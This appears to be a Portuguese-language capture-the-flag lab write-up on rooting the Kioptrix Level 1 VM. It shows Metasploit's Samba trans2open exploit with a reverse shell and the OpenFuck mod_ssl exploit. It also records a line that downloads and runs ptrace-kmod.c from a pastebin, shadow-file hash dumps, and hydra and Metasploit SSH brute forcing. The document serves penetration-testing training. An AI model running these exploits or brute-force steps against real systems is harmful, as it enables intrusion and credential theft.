Para realizar esse laboratório utilizei um SO kali linux com as seguintes configurações:

Linux kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 (2022-01-31) x86_64 GNU/Linux

O alvo foi uma VM Kioptrix, disponibilizada no seguinte endereço:

https://www.vulnhub.com/entry/kioptrix-level-1-1,22/


Gaining Root with Metasploit

    msfconsole
        > search trans2open
            Matching Modules
            ================
               #  Name                              Disclosure Date  Rank   Check  Description
               -  ----                              ---------------  ----   -----  -----------
               0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
               1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
               2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
               3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)

            Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

        > use 1 (linux/samba/trans2open)
        > set rhost 168.168.57.4
        > options
            Module options (exploit/linux/samba/trans2open):

               Name    Current Setting  Required  Description
               ----    ---------------  --------  -----------
               RHOSTS  192.168.57.4     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
                                                  tasploit
               RPORT   139              yes       The target port (TCP)

            Payload options (linux/x86/meterpreter/reverse_tcp):

               Name   Current Setting  Required  Description
               ----   ---------------  --------  -----------
               LHOST  192.168.57.5     yes       The listen address (an interface may be specified)
               LPORT  4444             yes       The listen port

            Exploit target:

               Id  Name
               --  ----
               0   Samba 2.2.x - Bruteforce

        > set payload linux/x86 (doble Tab)
            set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
            set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
            set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
            set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
            set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
            set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
            set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
            set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
            set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
            set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
            set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
            set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
            set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
            set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
            set payload linux/x86/read_file
            
        > set payload linux/x86/shell_reverse_tcp
        > options
            Module options (exploit/linux/samba/trans2open):

               Name    Current Setting  Required  Description
               ----    ---------------  --------  -----------
               RHOSTS  192.168.57.4     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
                                                  tasploit
               RPORT   139              yes       The target port (TCP)


            Payload options (linux/x86/shell_reverse_tcp):

               Name   Current Setting  Required  Description
               ----   ---------------  --------  -----------
               CMD    /bin/sh          yes       The command string to execute
               LHOST  192.168.57.5     yes       The listen address (an interface may be specified)
               LPORT  4444             yes       The listen port


            Exploit target:

               Id  Name
               --  ----
               0   Samba 2.2.x - Bruteforce

        > run
            ...
            [*] 192.168.57.4:139 - Trying return address 0xbffff7fc...
            [*] 192.168.57.4:139 - Trying return address 0xbffff6fc...
            [*] Command shell session 5 opened (192.168.57.5:4444 -> 192.168.57.4:32812 ) at 2022-08-31 10:49:51 -0400

            [*] Command shell session 6 opened (192.168.57.5:4444 -> 192.168.57.4:32813 ) at 2022-08-31 10:49:53 -0400
            [*] Command shell session 7 opened (192.168.57.5:4444 -> 192.168.57.4:32814 ) at 2022-08-31 10:49:54 -0400
            [*] Command shell session 8 opened (192.168.57.5:4444 -> 192.168.57.4:32815 ) at 2022-08-31 10:49:55 -0400

            (consegui acesso)
 
                    whoami
                    root
                    hostname
                    kioptrix.level1

Manual Exploitation
    pesquisar : vulnerabilidade do openluck
    https://github.com/heltonWernik/OpenLuck

    #git clone https://github.com/heltonWernik/OpenFuck.git
    #apt-get install libssl-dev
    #gcc -o OpenFuck OpenFuck.c -lcrypto
    #./OpenFuck | grep 1.3.20
    #./OpenFuck 0x6b 192.168.57.4 -c 40
        *******************************************************************
        * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
        *******************************************************************
        * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
        * #hackarena  irc.brasnet.org                                     *
        * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
        * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
        * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
        *******************************************************************

        Connection... 40 of 40
        Establishing SSL connection
        cipher: 0x4043808c   ciphers: 0x80f8068
        Ready to send shellcode
        Spawning shell...
        bash: no job control in this shell
        bash-2.05$
        race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt
        --15:30:39--  https://pastebin.com/raw/C7v25Xr9
                   => `ptrace-kmod.c'
        Connecting to pastebin.com:443... connected!
        HTTP request sent, awaiting response... 200 OK
        Length: unspecified [text/plain]

            0K ...                                                    @   3.84 MB/s

        15:30:40 (3.84 MB/s) - `ptrace-kmod.c' saved [4026]

        ptrace-kmod.c:183:1: warning: no newline at end of file
        [+] Attached to 1470
        [+] Waiting for signal
        [+] Signal caught
        [+] Shellcode placed at 0x4001189d
        [+] Now wait for suid shell...

        (consegui acesso)
        
        #sudo -l
            User root may run the following commands on this host:
                (ALL) AL
        #cat /etc/passwd
            ...
            root:x:0:0:root:/root:/bin/bash
            ...
            apache:x:48:48:Apache:/var/www:/bin/false
            squid:x:23:23::/var/spool/squid:/dev/null
            pcap:x:77:77::/var/arpwatch:/bin/nologin
            john:x:500:500::/home/john:/bin/bash
            harold:x:501:501::/home/harold:/bin/bash


        #cat /etc/shadow

            root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
            ...
            squid:!!:14513:0:99999:7:::
            pcap:!!:14513:0:99999:7:::
            john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
            harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::


Brute Force Attacks
    hydra -l root -P /usr/share/wordlists/metasploit/ (doble Tab)
        ...
        ipmi_passwords.txt                        tomcat_mgr_default_userpass.txt
        ipmi_users.txt                            tomcat_mgr_default_users.txt
        joomla.txt                                unix_passwords.txt
        keyboard-patterns.txt                     unix_users.txt
        lync_subdomains.txt                       vnc_passwords.txt
        malicious_urls.txt                        vxworks_collide_20.txt
        mirai_pass.txt                            vxworks_common_20.txt
        mirai_user_pass.txt                       wp-exploitable-plugins.txt
        mirai_user.txt                            wp-exploitable-themes.txt
        multi_vendor_cctv_dvr_pass.txt            wp-plugins.txt
        multi_vendor_cctv_dvr_users.txt           wp-themes.txt

    hydra -l root -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.57.4:22 -t 4 -V


    msfconsole
        > search ssh
            Matching Modules
            ================

               #   Name                                                        Disclosure Date  Rank       Check  Description
               -   ----                                                        ---------------  ----       -----  -----------
               0   exploit/linux/http/alienvault_exec                          2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
               1   auxiliary/scanner/ssh/apache_karaf_command_execution        2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
               2   auxiliary/scanner/ssh/karaf_login                                            normal     No     Apache Karaf Login Utility
               3   exploit/apple_ios/ssh/cydia_default_ssh                     2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability

            ...
               0  auxiliary/scanner/ssh/ssh_login                                                normal  No     SSH Login Check Scanner


            > use auxiliary/scanner/ssh/ssh_login
                > options
                    Module options (auxiliary/scanner/ssh/ssh_login):
                   Name              Current Setting  Required  Description
                   ----              ---------------  --------  -----------
                   BLANK_PASSWORDS   false            no        Try blank passwords for all users
                   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
                   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
                   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
                   DB_ALL_USERS      false            no        Add all users in the current database to the list
                   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none,
                                                                user, user&realm)
                   PASSWORD                           no        A specific password to authenticate with
                   PASS_FILE                          no        File containing passwords, one per line
                   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wik
                                                                i/Using-Metasploit
                   RPORT             22               yes       The target port
                   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
                   THREADS           1                yes       The number of concurrent threads (max one per host)
                   USERNAME                           no        A specific username to authenticate as
                   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
                   USER_AS_PASS      false            no        Try the username as the password for all users
                   USER_FILE                          no        File containing usernames, one per line
                   VERBOSE           false            yes       Whether to print output for all attempts

                > set username root
                > set pass file /usr/share/wordlist/unix_passwords.txt
                > set rhost 192.168.57.4
                > options
                > set threads 10
                > run
                > set verbose true
                > true
                > run

